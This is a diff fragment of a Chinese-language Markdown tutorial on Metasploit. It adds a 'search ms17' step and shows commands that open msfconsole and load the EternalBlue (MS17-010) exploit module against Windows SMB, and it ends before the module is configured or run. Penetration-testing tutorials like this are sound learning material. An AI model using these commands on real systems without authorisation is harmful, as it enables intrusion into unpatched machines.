@@ -10,10 +10,13 @@ msf使用法则：`使用模块` -> `配置模块必选项` -> `运行模块`
 
 ### eg: metasploit 攻击 windows 操作系统
 
-metasploit攻击永恒之蓝流程
+metasploit通过永恒之蓝病毒漏洞攻击流程
 
 ```shell
 msfconsole
+
+# 搜索
+search ms17
 
 # 使用模块
 use exploit/windows/smb/ms17_010_eternalblue
